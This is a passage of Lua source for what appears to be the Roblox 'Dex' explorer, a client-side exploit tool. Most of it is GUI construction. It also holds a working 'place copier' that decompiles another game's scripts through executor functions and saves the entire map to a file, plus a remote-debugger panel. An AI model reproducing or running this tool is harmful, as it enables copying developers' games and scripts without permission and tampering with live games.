NewGuiPart122.Size = UDim2.new(1, -20, 0, 30)
NewGuiPart122.Font = Enum.Font.SourceSans
NewGuiPart122.FontSize = Enum.FontSize.Size18
NewGuiPart122.Text = "Lighting Properties"
NewGuiPart122.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart123.Name = "Status"
NewGuiPart123.Parent = NewGuiPart121
NewGuiPart123.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart123.BackgroundTransparency = 1
NewGuiPart123.Position = UDim2.new(0, 60, 0, 30)
NewGuiPart123.Size = UDim2.new(0, 50, 0, 15)
NewGuiPart123.Font = Enum.Font.SourceSans
NewGuiPart123.FontSize = Enum.FontSize.Size18
NewGuiPart123.Text = "Off"
NewGuiPart123.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart124.Name = "Change"
NewGuiPart124.Parent = NewGuiPart121
NewGuiPart124.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
NewGuiPart124.BorderSizePixel = 0
NewGuiPart124.Position = UDim2.new(0, 10, 0, 30)
NewGuiPart124.Size = UDim2.new(0, 40, 0, 15)
NewGuiPart124.Font = Enum.Font.SourceSans
NewGuiPart124.FontSize = Enum.FontSize.Size14
NewGuiPart124.Text = ""

NewGuiPart125.Name = "OnBar"
NewGuiPart125.Parent = NewGuiPart124
NewGuiPart125.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
NewGuiPart125.BorderSizePixel = 0
NewGuiPart125.Size = UDim2.new(0, 0, 0, 15)
NewGuiPart125.Font = Enum.Font.SourceSans
NewGuiPart125.FontSize = Enum.FontSize.Size14
NewGuiPart125.Text = ""

NewGuiPart126.Name = "Bar"
NewGuiPart126.Parent = NewGuiPart124
NewGuiPart126.BackgroundColor3 = Color3.new(0, 0, 0)
NewGuiPart126.BorderSizePixel = 0
NewGuiPart126.ClipsDescendants = true
NewGuiPart126.Position = UDim2.new(0, -2, 0, -2)
NewGuiPart126.Size = UDim2.new(0, 10, 0, 19)
NewGuiPart126.Font = Enum.Font.SourceSans
NewGuiPart126.FontSize = Enum.FontSize.Size14
NewGuiPart126.Text = ""

NewGuiPart127.Name = "CameraInstances"
NewGuiPart127.Parent = NewGuiPart114
NewGuiPart127.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart127.BackgroundTransparency = 1
NewGuiPart127.Position = UDim2.new(0, 0, 0, 180)
NewGuiPart127.Size = UDim2.new(1, 0, 0, 60)

NewGuiPart128.Name = "SName"
NewGuiPart128.Parent = NewGuiPart127
NewGuiPart128.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart128.BackgroundTransparency = 1
NewGuiPart128.Position = UDim2.new(0, 10, 0, 0)
NewGuiPart128.Size = UDim2.new(1, -20, 0, 30)
NewGuiPart128.Font = Enum.Font.SourceSans
NewGuiPart128.FontSize = Enum.FontSize.Size18
NewGuiPart128.Text = "Camera Instances"
NewGuiPart128.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart129.Name = "Status"
NewGuiPart129.Parent = NewGuiPart127
NewGuiPart129.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart129.BackgroundTransparency = 1
NewGuiPart129.Position = UDim2.new(0, 60, 0, 30)
NewGuiPart129.Size = UDim2.new(0, 50, 0, 15)
NewGuiPart129.Font = Enum.Font.SourceSans
NewGuiPart129.FontSize = Enum.FontSize.Size18
NewGuiPart129.Text = "Off"
NewGuiPart129.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart130.Name = "Change"
NewGuiPart130.Parent = NewGuiPart127
NewGuiPart130.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
NewGuiPart130.BorderSizePixel = 0
NewGuiPart130.Position = UDim2.new(0, 10, 0, 30)
NewGuiPart130.Size = UDim2.new(0, 40, 0, 15)
NewGuiPart130.Font = Enum.Font.SourceSans
NewGuiPart130.FontSize = Enum.FontSize.Size14
NewGuiPart130.Text = ""

NewGuiPart131.Name = "OnBar"
NewGuiPart131.Parent = NewGuiPart130
NewGuiPart131.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
NewGuiPart131.BorderSizePixel = 0
NewGuiPart131.Size = UDim2.new(0, 0, 0, 15)
NewGuiPart131.Font = Enum.Font.SourceSans
NewGuiPart131.FontSize = Enum.FontSize.Size14
NewGuiPart131.Text = ""

NewGuiPart132.Name = "Bar"
NewGuiPart132.Parent = NewGuiPart130
NewGuiPart132.BackgroundColor3 = Color3.new(0, 0, 0)
NewGuiPart132.BorderSizePixel = 0
NewGuiPart132.ClipsDescendants = true
NewGuiPart132.Position = UDim2.new(0, -2, 0, -2)
NewGuiPart132.Size = UDim2.new(0, 10, 0, 19)
NewGuiPart132.Font = Enum.Font.SourceSans
NewGuiPart132.FontSize = Enum.FontSize.Size14
NewGuiPart132.Text = ""

NewGuiPart133.Name = "Scripts"
NewGuiPart133.Parent = NewGuiPart114
NewGuiPart133.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart133.BackgroundTransparency = 1
NewGuiPart133.Size = UDim2.new(1, 0, 0, 60)

NewGuiPart134.Name = "SName"
NewGuiPart134.Parent = NewGuiPart133
NewGuiPart134.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart134.BackgroundTransparency = 1
NewGuiPart134.Position = UDim2.new(0, 10, 0, 0)
NewGuiPart134.Size = UDim2.new(1, -20, 0, 30)
NewGuiPart134.Font = Enum.Font.SourceSans
NewGuiPart134.FontSize = Enum.FontSize.Size18
NewGuiPart134.Text = "Save Scripts"
NewGuiPart134.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart135.Name = "Status"
NewGuiPart135.Parent = NewGuiPart133
NewGuiPart135.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart135.BackgroundTransparency = 1
NewGuiPart135.Position = UDim2.new(0, 60, 0, 30)
NewGuiPart135.Size = UDim2.new(0, 50, 0, 15)
NewGuiPart135.Font = Enum.Font.SourceSans
NewGuiPart135.FontSize = Enum.FontSize.Size18
NewGuiPart135.Text = "Off"
NewGuiPart135.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart136.Name = "Change"
NewGuiPart136.Parent = NewGuiPart133
NewGuiPart136.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
NewGuiPart136.BorderSizePixel = 0
NewGuiPart136.Position = UDim2.new(0, 10, 0, 30)
NewGuiPart136.Size = UDim2.new(0, 40, 0, 15)
NewGuiPart136.Font = Enum.Font.SourceSans
NewGuiPart136.FontSize = Enum.FontSize.Size14
NewGuiPart136.Text = ""

NewGuiPart137.Name = "OnBar"
NewGuiPart137.Parent = NewGuiPart136
NewGuiPart137.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
NewGuiPart137.BorderSizePixel = 0
NewGuiPart137.Size = UDim2.new(0, 0, 0, 15)
NewGuiPart137.Font = Enum.Font.SourceSans
NewGuiPart137.FontSize = Enum.FontSize.Size14
NewGuiPart137.Text = ""

NewGuiPart138.Name = "Bar"
NewGuiPart138.Parent = NewGuiPart136
NewGuiPart138.BackgroundColor3 = Color3.new(0, 0, 0)
NewGuiPart138.BorderSizePixel = 0
NewGuiPart138.ClipsDescendants = true
NewGuiPart138.Position = UDim2.new(0, -2, 0, -2)
NewGuiPart138.Size = UDim2.new(0, 10, 0, 19)
NewGuiPart138.Font = Enum.Font.SourceSans
NewGuiPart138.FontSize = Enum.FontSize.Size14
NewGuiPart138.Text = ""

NewGuiPart139.Name = "ToSave"
NewGuiPart139.Parent = NewGuiPart111
NewGuiPart139.BackgroundTransparency = 1
NewGuiPart139.Position = UDim2.new(0, 0, 0, 17)
NewGuiPart139.Size = UDim2.new(1, 0, 0, 20)
NewGuiPart139.Font = Enum.Font.SourceSans
NewGuiPart139.FontSize = Enum.FontSize.Size18
NewGuiPart139.Text = "To Save"
NewGuiPart139.TextColor3 = Color3.new(0, 0, 0)

NewGuiPart140.Name = "CopyList"
NewGuiPart140.Parent = NewGuiPart111
NewGuiPart140.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart140.BackgroundTransparency = 0.80000001192093
NewGuiPart140.Position = UDim2.new(0, 0, 0, 37)
NewGuiPart140.Size = UDim2.new(1, 0, 0, 163)

NewGuiPart141.Name = "Bottom"
NewGuiPart141.Parent = NewGuiPart111
NewGuiPart141.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart141.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart141.Position = UDim2.new(0, 0, 1, -50)
NewGuiPart141.Size = UDim2.new(1, 0, 0, 50)

NewGuiPart142.Parent = NewGuiPart141
NewGuiPart142.BackgroundTransparency = 1
NewGuiPart142.Position = UDim2.new(0, 4, 0, 0)
NewGuiPart142.Size = UDim2.new(1, -4, 1, 0)
NewGuiPart142.Font = Enum.Font.SourceSans
NewGuiPart142.FontSize = Enum.FontSize.Size14
NewGuiPart142.Text = "After the map saves, open a new place on studio, then right click Lighting and \"Insert from file...\", then select your file and run the unpacker script inside the folder."
NewGuiPart142.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart142.TextWrapped = true
NewGuiPart142.TextXAlignment = Enum.TextXAlignment.Left
NewGuiPart142.TextYAlignment = Enum.TextYAlignment.Top

NewGuiPart143.Name = "Save"
NewGuiPart143.Parent = NewGuiPart111
NewGuiPart143.BackgroundColor3 = Color3.new(0.941177, 0.941177, 0.941177)
NewGuiPart143.BackgroundTransparency = 0.80000001192093
NewGuiPart143.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart143.Position = UDim2.new(0, 0, 1, -80)
NewGuiPart143.Size = UDim2.new(1, 0, 0, 30)
NewGuiPart143.Font = Enum.Font.SourceSans
NewGuiPart143.FontSize = Enum.FontSize.Size18
NewGuiPart143.Text = "Save"

NewGuiPart144.Name = "FileName"
NewGuiPart144.Parent = NewGuiPart111
NewGuiPart144.BackgroundColor3 = Color3.new(0.941177, 0.941177, 0.941177)
NewGuiPart144.BackgroundTransparency = 0.60000002384186
NewGuiPart144.Position = UDim2.new(0, 0, 1, -105)
NewGuiPart144.Size = UDim2.new(1, 0, 0, 25)
NewGuiPart144.Font = Enum.Font.SourceSans
NewGuiPart144.FontSize = Enum.FontSize.Size18
NewGuiPart144.Text = "PlaceName"
NewGuiPart144.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart145.Name = "Entry"
NewGuiPart145.Parent = NewGuiPart111
NewGuiPart145.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart145.BackgroundTransparency = 1
NewGuiPart145.Size = UDim2.new(1, 0, 0, 22)
NewGuiPart145.Visible = false

NewGuiPart146.Name = "Change"
NewGuiPart146.Parent = NewGuiPart145
NewGuiPart146.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart146.BackgroundTransparency = 0.60000002384186
NewGuiPart146.Position = UDim2.new(0, 10, 0, 1)
NewGuiPart146.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart146.ZIndex = 2
NewGuiPart146.Font = Enum.Font.SourceSans
NewGuiPart146.FontSize = Enum.FontSize.Size18
NewGuiPart146.Text = ""
NewGuiPart146.TextColor3 = Color3.new(1, 1, 1)

NewGuiPart147.Name = "enabled"
NewGuiPart147.Parent = NewGuiPart146
NewGuiPart147.BackgroundColor3 = Color3.new(0.380392, 0.380392, 0.380392)
NewGuiPart147.BackgroundTransparency = 0.40000000596046
NewGuiPart147.BorderSizePixel = 0
NewGuiPart147.Position = UDim2.new(0, 3, 0, 3)
NewGuiPart147.Size = UDim2.new(0, 14, 0, 14)
NewGuiPart147.Font = Enum.Font.SourceSans
NewGuiPart147.FontSize = Enum.FontSize.Size14
NewGuiPart147.Text = ""

NewGuiPart148.Name = "Info"
NewGuiPart148.Parent = NewGuiPart145
NewGuiPart148.BackgroundTransparency = 1
NewGuiPart148.Position = UDim2.new(0, 40, 0, 0)
NewGuiPart148.Size = UDim2.new(1, -40, 0, 22)
NewGuiPart148.Font = Enum.Font.SourceSans
NewGuiPart148.FontSize = Enum.FontSize.Size18
NewGuiPart148.Text = "Workspace"
NewGuiPart148.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart148.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart149.Name = "RemoteDebugWindow"
NewGuiPart149.Parent = NewGuiPart1
NewGuiPart149.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart149.BackgroundTransparency = 0.10000000149012
NewGuiPart149.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart149.Position = UDim2.new(1, 0, 0, 0)
NewGuiPart149.Size = UDim2.new(0, 300, 1, 0)

NewGuiPart161.Name = "GetSetting"
NewGuiPart161.Parent = NewGuiPart149
NewGuiPart161.Archivable = true

NewGuiPart150.Name = "Header"
NewGuiPart150.Parent = NewGuiPart149
NewGuiPart150.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart150.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart150.Size = UDim2.new(1, 0, 0, 17)

NewGuiPart151.Parent = NewGuiPart150
NewGuiPart151.BackgroundTransparency = 1
NewGuiPart151.Position = UDim2.new(0, 4, 0, 0)
NewGuiPart151.Size = UDim2.new(1, -4, 1, 0)
NewGuiPart151.Font = Enum.Font.SourceSans
NewGuiPart151.FontSize = Enum.FontSize.Size14
NewGuiPart151.Text = "Remote Debugger"
NewGuiPart151.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart151.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart152.Name = "Desc"
NewGuiPart152.Parent = NewGuiPart149
NewGuiPart152.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart152.BackgroundTransparency = 1
NewGuiPart152.Position = UDim2.new(0, 0, 0, 20)
NewGuiPart152.Size = UDim2.new(1, 0, 0, 40)
NewGuiPart152.Font = Enum.Font.SourceSans
NewGuiPart152.FontSize = Enum.FontSize.Size32
NewGuiPart152.Text = "Have fun with remotes"
NewGuiPart152.TextWrapped = true
return NewGuiPart1
end
local D_E_X = CreateGui()
D_E_X.Parent = game.Players.LocalPlayer.PlayerGui
spawn(function()
	local Gui = D_E_X
	

local IntroFrame = Gui:WaitForChild("IntroFrame")

local SideMenu = Gui:WaitForChild("SideMenu")
local OpenToggleButton = Gui:WaitForChild("Toggle")
local CloseToggleButton = SideMenu:WaitForChild("Toggle")
local OpenScriptEditorButton = SideMenu:WaitForChild("OpenScriptEditor")

local ScriptEditor = Gui:WaitForChild("ScriptEditor")

local SlideOut = SideMenu:WaitForChild("SlideOut")
local SlideFrame = SlideOut:WaitForChild("SlideFrame")
local Slant = SideMenu:WaitForChild("Slant")

local ExplorerButton = SlideFrame:WaitForChild("Explorer")
local SettingsButton = SlideFrame:WaitForChild("Settings")

local SelectionBox = Instance.new("SelectionBox")
SelectionBox.Parent = Gui

local ExplorerPanel = Gui:WaitForChild("ExplorerPanel")
local PropertiesFrame = Gui:WaitForChild("PropertiesFrame")
local SaveMapWindow = Gui:WaitForChild("SaveMapWindow")
local RemoteDebugWindow = Gui:WaitForChild("RemoteDebugWindow")

local SettingsPanel = Gui:WaitForChild("SettingsPanel")
local SettingsListener = SettingsPanel:WaitForChild("GetSetting")
local SettingTemplate = SettingsPanel:WaitForChild("SettingTemplate")
local SettingList = SettingsPanel:WaitForChild("SettingList")

local SaveMapCopyList = SaveMapWindow:WaitForChild("CopyList")
local SaveMapSettingFrame = SaveMapWindow:WaitForChild("MapSettings")
local SaveMapName = SaveMapWindow:WaitForChild("FileName")
local SaveMapButton = SaveMapWindow:WaitForChild("Save")
local SaveMapCopyTemplate = SaveMapWindow:WaitForChild("Entry")
local SaveMapSettings = {
	CopyWhat = {
		Workspace = true,
		Lighting = true,
		ReplicatedStorage = true,
		ReplicatedFirst = true,
		StarterPack = true,
		StarterGui = true,
		StarterPlayer = true
	},
	SaveScripts = true,
	SaveTerrain = true,
	LightingProperties = true,
	CameraInstances = true
}

local SelectionChanged = ExplorerPanel:WaitForChild("SelectionChanged")
local GetSelection = ExplorerPanel:WaitForChild("GetSelection")
local SetSelection = ExplorerPanel:WaitForChild("SetSelection")

local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()

local CurrentWindow = "Nothing c:"
local Windows = {
	Explorer = {
		ExplorerPanel,
		PropertiesFrame
	},
	Settings = {SettingsPanel},
	SaveMap = {SaveMapWindow},
	Remotes = {RemoteDebugWindow}
}

function switchWindows(wName,over)
	if CurrentWindow == wName and not over then return end
	
	local count = 0
	
	for i,v in pairs(Windows) do
		count = 0
		if i ~= wName then
			for _,c in pairs(v) do c:TweenPosition(UDim2.new(1, 30, count * 0.5, count * 36), "Out", "Quad", 0.5, true) count = count + 1 end
		end
	end
	
	count = 0
	
	if Windows[wName] then
		for _,c in pairs(Windows[wName]) do c:TweenPosition(UDim2.new(1, -300, count * 0.5, count * 36), "Out", "Quad", 0.5, true) count = count + 1 end
	end
	
	if wName ~= "Nothing c:" then
		CurrentWindow = wName
		for i,v in pairs(SlideFrame:GetChildren()) do
			v.BackgroundTransparency = 1
			v.Icon.ImageColor3 = Color3.new(70/255, 70/255, 70/255)
		end
		if SlideFrame:FindFirstChild(wName) then
			SlideFrame[wName].BackgroundTransparency = 0.5
			SlideFrame[wName].Icon.ImageColor3 = Color3.new(0,0,0)
		end
	end
end

function toggleDex(on)
	if on then
		SideMenu:TweenPosition(UDim2.new(1, -330, 0, 0), "Out", "Quad", 0.5, true)
		OpenToggleButton:TweenPosition(UDim2.new(1,0,0,0), "Out", "Quad", 0.5, true)
		switchWindows(CurrentWindow,true)
	else
		SideMenu:TweenPosition(UDim2.new(1, 0, 0, 0), "Out", "Quad", 0.5, true)
		OpenToggleButton:TweenPosition(UDim2.new(1,-30,0,0), "Out", "Quad", 0.5, true)
		switchWindows("Nothing c:")
	end
end

local Settings = {
	ClickSelect = false,
	SelBox = false,
	ClearProps = false,
	SelectUngrouped = true,
	SaveInstanceScripts = true
}

function ReturnSetting(set)
	if set == "ClearProps" then
		return Settings.ClearProps
	elseif set == "SelectUngrouped" then
		return Settings.SelectUngrouped
	end
end

OpenToggleButton.MouseButton1Up:connect(function()
	toggleDex(true)
end)

OpenScriptEditorButton.MouseButton1Up:connect(function()
	if OpenScriptEditorButton.Active then
		ScriptEditor.Visible = true
	end
end)

CloseToggleButton.MouseButton1Up:connect(function()
	if CloseToggleButton.Active then
		toggleDex(false)
	end
end)

for i,v in pairs(SlideFrame:GetChildren()) do
	v.MouseButton1Click:connect(function()
		switchWindows(v.Name)
	end)
	
	v.MouseEnter:connect(function()v.BackgroundTransparency = 0.5 end)
	v.MouseLeave:connect(function()if CurrentWindow~=v.Name then v.BackgroundTransparency = 1 end end)
end


function createSetting(name,interName,defaultOn)
	local newSetting = SettingTemplate:Clone()
	newSetting.Position = UDim2.new(0,0,0,#SettingList:GetChildren() * 60)
	newSetting.SName.Text = name
	
	local function toggle(on)
		if on then
			newSetting.Change.Bar:TweenPosition(UDim2.new(0,32,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			newSetting.Change.OnBar:TweenSize(UDim2.new(0,34,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			newSetting.Status.Text = "On"
			Settings[interName] = true
		else
			newSetting.Change.Bar:TweenPosition(UDim2.new(0,-2,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			newSetting.Change.OnBar:TweenSize(UDim2.new(0,0,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			newSetting.Status.Text = "Off"
			Settings[interName] = false
		end
	end	
	
	newSetting.Change.MouseButton1Click:connect(function()
		toggle(not Settings[interName])
	end)
	
	newSetting.Visible = true
	newSetting.Parent = SettingList
	
	if defaultOn then
		toggle(true)
	end
end

createSetting("Click part to select","ClickSelect",false)
createSetting("Selection Box","SelBox",false)
createSetting("Clear property value on focus","ClearProps",false)
createSetting("Select ungrouped models","SelectUngrouped",true)
createSetting("SaveInstance decompiles scripts","SaveInstanceScripts",true)

local function getSelection()
	local t = GetSelection:Invoke()
	if t and #t > 0 then
		return t[1]
	else
		return nil
	end
end

Mouse.Button1Down:connect(function()
	if CurrentWindow == "Explorer" and Settings.ClickSelect then
		local target = Mouse.Target
		if target then
			SetSelection:Invoke({target})
		end
	end
end)

SelectionChanged.Event:connect(function()
	if Settings.SelBox then
		local success,err = pcall(function()
			local selection = getSelection()
			SelectionBox.Adornee = selection
		end)
		if err then
			SelectionBox.Adornee = nil
		end
	end
end)

SettingsListener.OnInvoke = ReturnSetting

-- Map Copier

function createMapSetting(obj,interName,defaultOn)
	local function toggle(on)
		if on then
			obj.Change.Bar:TweenPosition(UDim2.new(0,32,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			obj.Change.OnBar:TweenSize(UDim2.new(0,34,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			obj.Status.Text = "On"
			SaveMapSettings[interName] = true
		else
			obj.Change.Bar:TweenPosition(UDim2.new(0,-2,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			obj.Change.OnBar:TweenSize(UDim2.new(0,0,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			obj.Status.Text = "Off"
			SaveMapSettings[interName] = false
		end
	end	
	
	obj.Change.MouseButton1Click:connect(function()
		toggle(not SaveMapSettings[interName])
	end)
	
	obj.Visible = true
	obj.Parent = SaveMapSettingFrame
	
	if defaultOn then
		toggle(true)
	end
end

function createCopyWhatSetting(serv)
	if SaveMapSettings.CopyWhat[serv] then
		local newSetting = SaveMapCopyTemplate:Clone()
		newSetting.Position = UDim2.new(0,0,0,#SaveMapCopyList:GetChildren() * 22 + 5)
		newSetting.Info.Text = serv
		
		local function toggle(on)
			if on then
				newSetting.Change.enabled.Visible = true
				SaveMapSettings.CopyWhat[serv] = true
			else
				newSetting.Change.enabled.Visible = false
				SaveMapSettings.CopyWhat[serv] = false
			end
		end	
	
		newSetting.Change.MouseButton1Click:connect(function()
			toggle(not SaveMapSettings.CopyWhat[serv])
		end)
		
		newSetting.Visible = true
		newSetting.Parent = SaveMapCopyList
	end
end

createMapSetting(SaveMapSettingFrame.Scripts,"SaveScripts",true)
createMapSetting(SaveMapSettingFrame.Terrain,"SaveTerrain",true)
createMapSetting(SaveMapSettingFrame.Lighting,"LightingProperties",true)
createMapSetting(SaveMapSettingFrame.CameraInstances,"CameraInstances",true)

createCopyWhatSetting("Workspace")
createCopyWhatSetting("Lighting")
createCopyWhatSetting("ReplicatedStorage")
createCopyWhatSetting("ReplicatedFirst")
createCopyWhatSetting("StarterPack")
createCopyWhatSetting("StarterGui")
createCopyWhatSetting("StarterPlayer")

SaveMapName.Text = tostring(game.PlaceId).."MapCopy"

SaveMapButton.MouseButton1Click:connect(function()
	local copyWhat = {}

	local copyGroup = Instance.new("Model",game.ReplicatedStorage)

	local copyScripts = SaveMapSettings.SaveScripts

	local copyTerrain = SaveMapSettings.SaveTerrain

	local lightingProperties = SaveMapSettings.LightingProperties

	local cameraInstances = SaveMapSettings.CameraInstances

	-----------------------------------------------------------------------------------

	for i,v in pairs(SaveMapSettings.CopyWhat) do
		if v then
			table.insert(copyWhat,i)
		end
	end

	local consoleFunc = printconsole or writeconsole

	if consoleFunc then
		consoleFunc("Raspberry Pi's place copier loaded.")
		consoleFunc("Copying map of game "..tostring(game.PlaceId)..".")
	end

	function archivable(root)
		for i,v in pairs(root:GetChildren()) do
			if not game.Players:GetPlayerFromCharacter(v) then
				v.Archivable = true
				archivable(v)
			end
		end
	end

	function decompileS(root)
		for i,v in pairs(root:GetChildren()) do
			pcall(function()
				if v:IsA("LocalScript") then
					local isDisabled = v.Disabled
					v.Disabled = true
					v.Source = decompile(v)
					v.Disabled = isDisabled
				
					if v.Source == "" then 
						if consoleFunc then consoleFunc("LocalScript "..v.Name.." had a problem decompiling.") end
					else
						if consoleFunc then consoleFunc("LocalScript "..v.Name.." decompiled.") end
					end
				elseif v:IsA("ModuleScript") then
					v.Source = decompile(v)
				
					if v.Source == "" then 
						if consoleFunc then consoleFunc("ModuleScript "..v.Name.." had a problem decompiling.") end
					else
						if consoleFunc then consoleFunc("ModuleScript "..v.Name.." decompiled.") end
					end
				end
			end)
			decompileS(v)
		end
	end

	for i,v in pairs(copyWhat) do archivable(game[v]) end

	for j,obj in pairs(copyWhat) do
		if obj ~= "StarterPlayer" then
			local newFolder = Instance.new("Folder",copyGroup)
			newFolder.Name = obj
			for i,v in pairs(game[obj]:GetChildren()) do
				if v ~= copyGroup then
					pcall(function()
						v:Clone().Parent = newFolder
					end)
				end
			end
		else
			local newFolder = Instance.new("Model",copyGroup)
			newFolder.Name = "StarterPlayer"
			for i,v in pairs(game[obj]:GetChildren()) do
				local newObj = Instance.new("Folder",newFolder)
				newObj.Name = v.Name
				for _,c in pairs(v:GetChildren()) do
					if c.Name ~= "ControlScript" and c.Name ~= "CameraScript" then
						c:Clone().Parent = newObj
					end
				end
			end
		end
	end

	if workspace.CurrentCamera and cameraInstances then
		local cameraFolder = Instance.new("Model",copyGroup)
		cameraFolder.Name = "CameraItems"
		for i,v in pairs(workspace.CurrentCamera:GetChildren()) do v:Clone().Parent = cameraFolder end
	end

	if copyTerrain then
		local myTerrain = workspace.Terrain:CopyRegion(workspace.Terrain.MaxExtents)
		myTerrain.Parent = copyGroup
	end

	function saveProp(obj,prop,par)
		local myProp = obj[prop]
		if type(myProp) == "boolean" then
			local newProp = Instance.new("BoolValue",par)
			newProp.Name = prop
			newProp.Value = myProp
		elseif type(myProp) == "number" then
			local newProp = Instance.new("IntValue",par)
			newProp.Name = prop
			newProp.Value = myProp
		elseif type(myProp) == "string" then
			local newProp = Instance.new("StringValue",par)
			newProp.Name = prop
			newProp.Value = myProp
		elseif type(myProp) == "userdata" then -- Assume Color3
			pcall(function()
				local newProp = Instance.new("Color3Value",par)
				newProp.Name = prop
				newProp.Value = myProp
			end)
		end
	end

	if lightingProperties then
		local lightingProps = Instance.new("Model",copyGroup)
		lightingProps.Name = "LightingProperties"
	
		saveProp(game.Lighting,"Ambient",lightingProps)
		saveProp(game.Lighting,"Brightness",lightingProps)
		saveProp(game.Lighting,"ColorShift_Bottom",lightingProps)
		saveProp(game.Lighting,"ColorShift_Top",lightingProps)
		saveProp(game.Lighting,"GlobalShadows",lightingProps)
		saveProp(game.Lighting,"OutdoorAmbient",lightingProps)
		saveProp(game.Lighting,"Outlines",lightingProps)
		saveProp(game.Lighting,"GeographicLatitude",lightingProps)
		saveProp(game.Lighting,"TimeOfDay",lightingProps)
		saveProp(game.Lighting,"FogColor",lightingProps)
		saveProp(game.Lighting,"FogEnd",lightingProps)
		saveProp(game.Lighting,"FogStart",lightingProps)
	end

	if decompile and copyScripts then
		decompileS(copyGroup)
	end

	if SaveInstance then
		SaveInstance(copyGroup,SaveMapName.Text..".rbxm")
	elseif saveinstance then
		saveinstance(getelysianpath()..SaveMapName.Text..".rbxm",copyGroup)
	end
	--print("Saved!")
	if consoleFunc then
		consoleFunc("The map has been copied.")
	end
	SaveMapButton.Text = "The map has been saved"
	wait(5)
	SaveMapButton.Text = "Save"
end)

-- End Copier

wait()

IntroFrame:TweenPosition(UDim2.new(1,-300,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)

switchWindows("Explorer")

wait(1)

SideMenu.Visible = true

for i = 0,1,0.1 do
	IntroFrame.BackgroundTransparency = i
	IntroFrame.Main.BackgroundTransparency = i
	IntroFrame.Slant.ImageTransparency = i
	IntroFrame.Title.TextTransparency = i
	IntroFrame.Version.TextTransparency = i
	IntroFrame.Creator.TextTransparency = i
	wait()
end

IntroFrame.Visible = false

SlideFrame:TweenPosition(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
OpenScriptEditorButton:TweenPosition(UDim2.new(0,0,0,180),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
CloseToggleButton:TweenPosition(UDim2.new(0,0,0,210),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
Slant:TweenPosition(UDim2.new(0,0,0,240),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)

wait(0.5)

for i = 1,0,-0.1 do
	OpenScriptEditorButton.Icon.ImageTransparency = i
	CloseToggleButton.TextTransparency = i
	wait()
end

CloseToggleButton.Active = true
CloseToggleButton.AutoButtonColor = true

OpenScriptEditorButton.Active = true
OpenScriptEditorButton.AutoButtonColor = true
end)
spawn(function()
	-- initial states
local Option = {
	-- can modify object parents in the hierarchy
	Modifiable = false;
	-- can select objects
	Selectable = true;
}

-- MERELY

Option.Modifiable = true

-- END MERELY

-- general size of GUI objects, in pixels
local GUI_SIZE = 16
-- padding between items within each entry
local ENTRY_PADDING = 1
-- padding between each entry
local ENTRY_MARGIN = 1

local Input = game:GetService("UserInputService")
local HoldingCtrl = false
local HoldingShift = false

--[[

# Explorer Panel

A GUI panel that displays the game hierarchy.


## Selection Bindables

- `Function GetSelection ( )`

	Returns an array of objects representing the objects currently
	selected in the panel.

- `Function SetSelection ( Objects selection )`

	Sets the objects that are selected in the panel. `selection` is an array
	of objects.

- `Event SelectionChanged ( )`

	Fired after the selection changes.


## Option Bindables

- `Function GetOption ( string optionName )`

	If `optionName` is given, returns the value of that option. Otherwise,
	returns a table of options and their current values.

- `Function SetOption ( string optionName, bool value )`

	Sets `optionName` to `value`.

	Options:

	- Modifiable

		Whether objects can be modified by the panel.

		Note that modifying objects depends on being able to select them. If
		Selectable is false, then Actions will not be available. Reparenting
		is still possible, but only for the dragged object.

	- Selectable

